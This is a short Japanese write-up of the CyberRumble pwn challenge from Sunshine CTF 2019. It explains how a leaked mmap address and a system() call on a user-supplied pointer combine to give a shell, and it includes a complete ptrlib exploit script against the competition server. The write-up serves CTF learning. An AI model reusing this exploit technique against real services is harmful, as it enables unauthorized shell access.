# [pwn 200pts] CyberRumble - Sunshine CTF 2019
全部有効です。
```
$ checksec CyberRumble
[*] 'CyberRumble'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Full RELRO
    PIE:	PIE enabled
```
いくつか機能があるのですが、どれもプログラミングミスで上手く機能していません。
私が使ったのは次の2つの機能です。

- `old_school`: シェルコードを実行できるがEXECフラグが立っていない。mmapされたアドレスは表示される。また、起動するかの質問にY,N以外の答えを渡すとmummapせずに終わる。
- `last_ride`: 渡した文字列がポインタとして認識されて`system(&s)`が実行される。

`old_school`でmmapした領域に実行したいコマンドを書き込み、`last_ride`でそのポインタを渡せばOKです。

```python
from ptrlib import *

sock = Socket("rumble.sunshinectf.org", 4300)
#sock = Socket("127.0.0.1", 4300)
#_ = input()

# cmd
shellcode = b"A" + b"sh"
sock.recvuntil("> ")
sock.sendline(b"old_school " + shellcode)
sock.recvuntil("written to ")
addr_shellcode = int(sock.recvline().rstrip().rstrip(b"."), 16)
sock.recvuntil("[y/n] ")
sock.sendline("w")
dump("addr_shellcode = " + hex(addr_shellcode))

# run
shellcmd = p64(addr_shellcode + 0x1)
shellcmd = shellcmd.replace(b'\x00', b'')
sock.recvuntil("> ")
sock.sendline(b"last_ride " + shellcmd)

sock.interactive()
```

# 感想
アセンブリちゃんと読めるかな問題でした。